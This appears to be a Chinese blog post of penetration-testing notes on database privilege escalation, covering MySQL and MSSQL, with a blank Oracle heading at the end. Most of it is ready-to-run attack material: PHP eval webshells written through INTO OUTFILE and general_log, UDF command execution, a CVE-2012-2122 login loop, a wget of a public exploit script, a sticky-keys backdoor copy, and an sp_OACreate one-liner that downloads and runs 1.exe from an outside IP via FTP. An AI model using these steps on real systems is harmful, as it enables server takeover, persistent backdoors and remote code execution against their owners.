---
title: MySQL 数据库提权（webshell + UDF）
date: 2026-08-24 14:00:00
categories:
  - 渗透测试
tags:
  - 提权
  - MySQL
  - UDF
description: MySQL 数据库提权（webshell + UDF）
---

[权限提升：操作系统数据库姿势总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/462221.html)

[【权限提升】六种数据库提权&口令获取-阿里云开发者社区](https://developer.aliyun.com/article/1541591)

[数据库提权总结 - 随风kali - 博客园](https://www.cnblogs.com/sfsec/p/15222027.html)

[提权总结以及各种利用姿势](https://mp.weixin.qq.com/s/9fsn4UT29eXW7SFrTz5L1Q)

## **提权的方法总结**

一、系统漏洞提权

1. 获取操作系统类型以及版本号
2. 根据获取的系统版本号在互联网搜索exp
3. 尝试利用exp获取权限
4. 尝试反弹shell

二、数据库提权

- MySQL数据库——udf提权
- 数据库提权——mof提权
- 数据库提权——反弹端口提权
- 数据库提权——启动项提权

三、第三方软件/服务提权

- 通过第三方软件漏洞进行提权
- 通过服务端口、服务协议漏洞进行提权

# 数据库权限

```php
MySQL 3306 端口弱口令爆破
sqlmap 注入的 --sql-shell 模式
网站的数据库配置文件中拿到明文密码信息
CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限
```

##### **CVE-2012-2122复现：**

**采用shell脚本：（直接返回MySQL的shell）**

```php
for i in `seq 1 1000`; do mysql -u root --password=bad -h 192.168.186.128 2>/dev/null; done
```

![image-20251221193459059](/img/ctf/mysql-udf-privesc-001.png)

注意该方法只适用于较低版本：

![image-20251221194230451](/img/ctf/mysql-udf-privesc-002.png)

其他方法：https://blog.csdn.net/weixin_43606134/article/details/107928916#:~:text=%E7%9A%84%E7%AB%AF%E5%8F%A3-,%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4,-%E6%88%91%E4%BB%AC%E7%94%A8nmap

------

##### 常用MySQL数据库查询语句整理：

1）库与会话基础

```mysql
-- 查看当前连接信息
SELECT USER(), CURRENT_USER(), DATABASE(), VERSION();

-- 查看当前时间
SELECT NOW(), CURDATE(), CURTIME();

-- 查看所有数据库 / 选择数据库
SHOW DATABASES;
USE db_name;

-- 查看当前库
SELECT DATABASE();
```

2）表与结构（SHOW / DESCRIBE）

```mysql
-- 当前库所有表
SHOW TABLES;

-- 查看建表语句（最有用）
SHOW CREATE TABLE table_name;

-- 查看字段结构
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;

-- 查看表状态
SHOW TABLE STATUS LIKE 'table_name';

-- 查看索引
SHOW INDEX FROM table_name;

-- 查看视图
SHOW FULL TABLES WHERE Table_type = 'VIEW';
SHOW CREATE VIEW view_name;
```

3）information_schema 结构化查询（查库/表/字段/键/索引）

```mysql
-- 所有数据库
SELECT schema_name FROM information_schema.schemata;

-- 某库所有表
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'db_name';

-- 某表所有字段（含类型/是否可空/默认值）
SELECT column_name, column_type, is_nullable, column_default
FROM information_schema.columns
WHERE table_schema='db_name' AND table_name='table_name'
ORDER BY ordinal_position;

-- 主键/唯一键/普通索引（键约束层）
SELECT constraint_name, constraint_type
FROM information_schema.table_constraints
WHERE table_schema='db_name' AND table_name='table_name';

-- 具体哪些列属于某个键（如 PRIMARY）
SELECT constraint_name, column_name
FROM information_schema.key_column_usage
WHERE table_schema='db_name' AND table_name='table_name'
ORDER BY ordinal_position;

-- 索引明细（更细）
SELECT index_name, seq_in_index, column_name, non_unique
FROM information_schema.statistics
WHERE table_schema='db_name' AND table_name='table_name'
ORDER BY index_name, seq_in_index;
```

4）SELECT 基础（字段、别名、去重）

```mysql
-- 查所有列/部分列
SELECT * FROM table_name;
SELECT col1, col2 AS alias2 FROM table_name;

-- 去重
SELECT DISTINCT col1 FROM table_name;

-- 常用：限制返回行数
SELECT * FROM table_name LIMIT 10;
```

## 一、MySQL提权（3306）

[数据库提权总结 - 随风kali - 博客园](https://www.cnblogs.com/sfsec/p/15222027.html)

❗（注意MySQL和Windows的版本是否能漏洞利用）

打开MySQL： cmd

```
mysql -uroot -p
```

### 1、Webshell权限

#### into oufile 写 shell

（into oufile ：把 **SELECT 查询结果** 由 **MySQL 服务器端** 写入到一个文件里）

into oufile 写 shell要满足如下条件才可以写入

```mysql
1、知道网站物理路径
2、高权限数据库用户
3、load_file() 开启 即 secure_file_priv 无限制
4、网站路径有写入权限
```

 数据库查看是否有`secure_file_priv` 限制

```mysql
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
```

| Value | 说明            |
| ----- | ------------- |
| NULL  | 不允许导入或导出      |
| /     | 只允许在 / 目录导入导出 |
| 空     | 不限制目录         |

> 在 MySQL 5.5 之前 `secure_file_priv` 默认是空，这个情况下可以向任意绝对路径写文件
>
> 在 MySQL 5.5之后 `secure_file_priv` 默认是 NULL，这个情况下不可以写文件

##### ①**利用phpMyAdmin来into out file**

在phpMyAdmin中，我们可以利用log变量来猜测网站的绝对路径

![image-20251221201908149](/img/ctf/mysql-udf-privesc-003.png)

这里是用phpstudy搭建的网站，所以猜测网站目录在WWW目录下，或者通过其他手段的信息收集，来收集到我们的网站绝对路径。

有了网站路径，我们就可以执行SQL命令来进行写shell

（注意：这里也要求没有`secure_file_priv` 限制，打开my.ini文件，加入`secure_file_priv=''`语句再重启服务器）

(本机的MySQL版本是5.7.26，my.ini文件已加入`secure_file_priv=''`语句)

```mysql
select '<?php @eval($_POST[1]);?>' into outfile 'D:/phpstudy_pro/www/shell.php'
```

![image-20251221203214402](/img/ctf/mysql-udf-privesc-004.png)

蚁剑连：

![image-20251221203428670](/img/ctf/mysql-udf-privesc-005.png)

![image-20251221203443500](/img/ctf/mysql-udf-privesc-006.png)

##### ②利用sqlmap来into out file

如下（同样要求没有`secure_file_priv` 限制）：

```mysql
sqlmap -u "http://x.x.x.x/?id=x" --file-write="C:/Users/suifeng/Desktop/shell.php" --file-dest="C:/phpstudy_pro/WWW/shell.php"
```

#### 利用日志写shell

在MySQL 5.0 版本以上会创建日志文件，我们可以通过修改日志的全局变量中的存储位置来 getshell

语句：

```mysql
mysql>SHOW VARIABLES LIKE '%general%';
```

`general_log` 默认关闭，高权限的用户可以直接通过mysql命令行进行开启，开启后日志文件记录用户的每条指令，将其保存在`general_log` _file中。我们可以通过开启`general_log` ，然后自定义`general_log` _file来进行getshell。

```mysql
mysql> set global general_log = "ON";   #开启general_log
mysql> set global general_log_file='c:/phpstudy_pro/www/shell.php'; #修改general_log_file路径
```

![image-20251221204743113](/img/ctf/mysql-udf-privesc-007.png)

写入shell,可连蚁剑

```
mysql> select "<?php @eval($_POST['suifeng']);?>";
```

![image-20251221204835973](/img/ctf/mysql-udf-privesc-008.png)

### 2、服务器权限

#### UDF提权

[MYSQL UDF手动提权及自动化工具使用_udf提权工具-CSDN博客](https://blog.csdn.net/qq_45373631/article/details/121422573)

UDF(user-defined function)是MySQL的一个拓展接口，也可称之为用户自定义函数，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用一些系统函数如version()函数便捷。

###### **动态链接库**及其导入

利用前提：windows2003/2000

提权方法是把我们的动态链接库放置在特点的目录下，创建自定义函数，实现系统函数命令的调用，最终导致提权。

> 在MySQL<5.1 导出目录c:/windows或system32
>
> 在MySQL>=5.1 导出安装目录/lib/plugin/

在有注入点时候，我们可以通过sqlmap中里的UDF动态链接库进行导入

```mysql
#sqlmap中动态链接库位置（本机）
C:\SQLMAP\sqlmapproject-sqlmap-1e57a37\data\udf\mysql
```

里面有windows和Linux且64位和32位版本，根据被攻击器来进行选择

查找安装目录

```mysql
mysql> show variables like '%plugin%';
```

来到对应的目录下,自己创建一个/lib/plugin，创建好后我们就可以导入我们的动态链接库了。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。在~/phpStudy/MySQL/lib/目录下创建一个文件夹plugin，然后上传对应的udf.dll文件

![image-20251222172308305](/img/ctf/mysql-udf-privesc-009.png)

文件上传完成后，就可以通过sql语句来自定义函数了

```
#修改文件名后执行代码
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

![image-20251222173834993](/img/ctf/mysql-udf-privesc-010.png)

```mysql
#创建成功后，我们利用自定义函数进行命令执行
mysql > select sys_eval('whoami');
```

[具体导入操作](https://www.freebuf.com/articles/web/282401.html#:~:text=%E5%86%99%E5%85%A5%E8%84%9A%E6%9C%AC-,MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%2D%2D%2DUDF%E6%8F%90%E6%9D%83,-udf(user%2Ddefined)

[UDF 提权辅助](https://bewhale.github.io/tools/udf.html)

###### 工具(sqlmap)

[利用sqlmap](https://blog.csdn.net/qq_45373631/article/details/121422573#:~:text=sql-,%E8%A1%A5%E5%85%85%EF%BC%9A%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%90%E6%9D%83%EF%BC%8Cmsf%E3%80%81sqlmap%20%2D%2Dos%2Dshell,-MSF%3A)

前提：得到数据库账号密码、且用户可外连

```mysql
python2 sqlmap.py -d "mysql://root:root@192.168.142.130:3306/test" --os-shell
```

#### 补充：mof,启动项：

[数据库---提权思路 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/282401.html)

#### CVE-2016-6663、CVE-2016-6664组合提权

MySQL小于5.5.51或小于5.6.32或小于5.7.14及衍生版本，可以利用CVE-2016-6663、CVE-2016-6664组合进行测试提权。

1、利用CVE-2016-6663将www-data权限提升为mysql权限：

```mysql
cd /var/www/html/
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
./mysql-privesc-race test 123456 localhost testdb
```

2、利用CVE-2016-6664将MySQL权限提升为root权限：

```mysql
wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
chmod 777 mysql-chowned.sh
./mysql-chowned.sh /var/log/mysql/error.log
```

------

## 二、MSSQL提权—（1443）

[Tide安全团队——sql server提权总结 - 知乎](https://zhuanlan.zhihu.com/p/591938680)

#### mssql基本命令

```mssql
select @@version   #查看数据库版本
select db_name()   #查看当前数据库
select IS_SRVROLEMEMBER('sysadmin')  #判断是否为sa权限
select IS_MEMBER('db_owner')  #判断是否为dba权限
exec master..xp_msver    #查看数据库系统参数
#开启xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
#关闭xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure;
#禁用advanced options
EXEC sp_configure 'show advanced options',0;GO RECONFIGURE;
#sp_OACreate执行命令
DECLARE @js int
EXEC sp_OACreate 'ScriptControl',@js OUT
EXEC sp_OASetProperty @js,'Language','JavaScript'
ActiveXObject("Shell.Users");z=o.create("user");z.changePassword("pass","");z.setting("AccountType")=3;'
#sp_OACreate移动文件
declare @aa int
exec sp_oacreate 'scripting.filesystemobject' @aa out
exec sp_oamethod @aa, 'moveFile',null,'c:\temp\ipmi.log','c:\temp\ipmi1.log';
#sp_OACreate复制文件
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o,'copyfile',null,'c:\windows\explorer.exe','c:\windows\system32\sethc.exe';
#sp_OACreate删除文件
DECLARE @Result int
DECLARE @FSO_Token int
EXEC @Result = sp_OACreate 'Scripting.FileSystemObject', @FSO_Token OUTPUT
EXEC @Result = sp_OAMethod @FSO_Token, 'DeleteFile',NULL,'c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat'
EXEC @Result = sp_OADestrop @FSO_Token
```

#### mssql权限管理

```mssql
bulkadmin:这个角色可以运行BULK INSERT语句.该语句允许从文本文件中将数据导入到SQL Server2008数据库中,为需要执行大容量插入到数据库的域帐号而设计.
dbcreator:这个角色可以创建,更改,删除和还原任何数据库.不仅适合助理DBA角色,也可能适合开发人员角色.
diskadmin:这个角色用于管理磁盘文件,比如镜像数据库和添加备份设备.适合助理DBA
processadmin:SQL Server 2008可以同时多进程处理.这个角色可以结束进程(在SQL Server 2008中称为"删除")
public:有两大特点:第一,初始状态时没有权限;第二,所有数据库用户都是它的成员
securityadmin:这个角色将管理登录名及其属性.可以授权,拒绝和撤销服务器级/数据库级权限.可以重置登录名和密码
serveradmin:这个角色可以更改服务器范围的配置选项和关闭服务器
setupadmin:为需要管理联接服务器和控制启动的存储过程的用户而设计.
sysadmin:这个角色有权在SQL Server 2008 中执行任何操作.
```

#### xp_cmdshel提权

xp_cmdshell的作用类似于mysql的udf，其本质是一些sql语句的集合，xp_cmdshell也可以理解为一些危险性比较高的小脚本。

```
xp_cmdshell在mssql2000中开启，在2005之后就是默认禁止的，我们需要sa权限来开启xp_cmdshell
```

```mssql
#开启xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;

#执行命令
EXEC master.dbo.xp_cmdshell 'whoami'

#关闭开启xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell', 0;reconfigure
```

#### sp_OACreate提权

当xp_cmdshell不可用的时候，我们还可以利用sc_oacreate来进行提权

```mssql
#开启sc_oacreate
EXEC sp_configure 'show advanced options', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'Ole Automation Procedures', 1;  
RECONFIGURE WITH OVERRIDE;  
EXEC sp_configure 'show advanced options', 0;

#直接传马
DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, '%systemroot%\system32\cmd.exe /c echo open 222.180.210.113 > cmd.txt&echo 123>> cmd.txt&echo123>> cmd.txt&echo binary >> cmd.txt&echo get 1.exe >> cmd.txt&echo bye >> cmd.txt&ftp -s:cmd.txt&1.exe&1.exe&del cmd.txt. /q /f&del 1.exe /f /q'--
```

#### 沙盒提权

沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.

利用条件：

1，Access可以调用VBS(VBScript)**的函数**，以System权限执行任意命令

2，Access执行这个命令是有条件的，需要一个开关被打开

3，这个开关在注册表里

4，SA是有权限写注册表的

5，用SA写注册表的权限打开那个开关

6，调用Access里的执行命令方法，以system权限执行任意命令执行SQL命令，执行了以下命令

开启默认关闭的xp_regwrite存储过程：

```mssql
EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
```

利用jet.oledb执行系统命令添加系统账号：

```mssql
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
```

## 三、Oracle提权(1521)



































- 

